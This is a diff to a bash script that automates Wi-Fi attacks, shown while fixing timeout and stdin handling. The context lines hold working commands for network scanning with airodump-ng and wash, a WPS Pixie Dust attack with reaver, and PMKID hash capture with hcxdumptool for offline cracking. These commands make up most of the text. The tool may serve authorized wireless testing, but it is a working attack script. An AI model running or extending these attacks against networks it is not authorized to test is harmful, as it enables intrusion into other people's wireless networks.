@@ -226,7 +226,7 @@ run_wps_sweep() {
         return 0
     fi
     info "Sweeping for WPS-capable networks (20s)..."
-    timeout 20 wash -i "$MON" >> "$WORK/wash.log" 2>/dev/null
+    timeout -k 5 20 wash -i "$MON" >> "$WORK/wash.log" 2>/dev/null
     awk 'tolower($1) ~ /^[0-9a-f:]{17}$/ {print tolower($1), (tolower($5)=="yes" ? "wps-locked" : "wps")}' \
         "$WORK/wash.log" | sort -u | awk '!seen[$1]++' > "$WORK/wps_tags"
 }
@@ -289,7 +289,11 @@ scan_targets() {
     : > "$WORK/targets.csv"
     while :; do
         info "Pass $round: scanning ${SCAN_TIME}s across 2.4/5 GHz (hopping all channels)..."
-        timeout "$SCAN_TIME" airodump-ng -w "$WORK/scan_r${round}" --output-format csv "$MON" >/dev/null 2>&1
+        timeout -k 5 "$SCAN_TIME" airodump-ng -w "$WORK/scan_r${round}" --output-format csv "$MON" >/dev/null 2>&1
+        local scan_rc=$?
+        if (( scan_rc == 137 )); then
+            warn "airodump-ng ignored SIGTERM and was force-killed — driver wedge suspected (typical with Realtek 88xx dkms); keeping partial capture."
+        fi
         csv=$(ls -t "$WORK"/scan_r${round}-0*.csv 2>/dev/null | head -n1)
         if [[ -n "$csv" ]]; then
             awk '/^ *Station MAC,/{exit} {print}' "$csv" | cat - "$WORK/targets.csv" > "$WORK/targets.new"
@@ -314,7 +318,10 @@ scan_targets() {
         else
             warn "No networks seen yet."
         fi
-        read -r -p "$(echo "${CYAN}[*]${NC} BSSID of the network to test, [r]escan, or [q]uit: ")" pick
+        if ! read -r -p "$(echo "${CYAN}[*]${NC} BSSID of the network to test, [r]escan, or [q]uit: ")" pick; then
+            stop_monitor
+            die "No interactive input available (stdin closed) — aborting instead of looping on rescans."
+        fi
         case "$pick" in
             r|R) round=$((round+1)); continue ;;
             q|Q) stop_monitor; die "Aborted by user." ;;
@@ -350,7 +357,7 @@ confirm_target() {
 check_wps_presence() {
     info "Checking if target supports WPS (wash, 15s)..."
     local out
-    out=$(timeout 15 wash -i "$MON" -c "$TARGET_CH" 2>/dev/null)
+    out=$(timeout -k 5 15 wash -i "$MON" -c "$TARGET_CH" 2>/dev/null)
     if echo "$out" | grep -qiw "$TARGET_BSSID"; then
         ok "WPS enabled — Pixie Dust may apply."
         return 0
@@ -386,7 +393,7 @@ parse_reaver_log() {
 attack_wps_pixie() {
     info "=== WPS Pixie Dust attack (usually takes seconds) ==="
     local log="$WORK/pixie.log"
-    timeout 300 reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -K 1 > "$log" 2>&1
+    timeout -k 5 300 reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -K 1 > "$log" 2>&1
     tail -n 20 "$log"
     if parse_reaver_log "$log"; then
         ok "Pixie Dust succeeded — WPS vulnerable router."
@@ -416,12 +423,12 @@ attack_pmkid() {
     info "=== PMKID attack (clientless, no deauth, ${PMKID_TIME}s) ==="
     echo "$TARGET_BSSID" > "$WORK/target_filter"
     local ok_run=1
-    timeout "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" \
+    timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" \
         --filterlist_ap="$WORK/target_filter" --filtermode=2 --enable_status=1 \
         2>&1 | tee "$WORK/pmkid_status.log" || ok_run=0
     if [[ "$ok_run" -eq 0 ]]; then
         warn "filterlist unsupported by this hcxdumptool build — retrying unfiltered."
-        timeout "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" --enable_status=1 2>&1 | tail -n 5
+        timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" --enable_status=1 2>&1 | tail -n 5
     fi
     hcxpcapngtool -o "$WORK/pmkid.22000" "$WORK/pmkid.pcapng" 2>/dev/null
     if [[ -s "$WORK/pmkid.22000" ]]; then
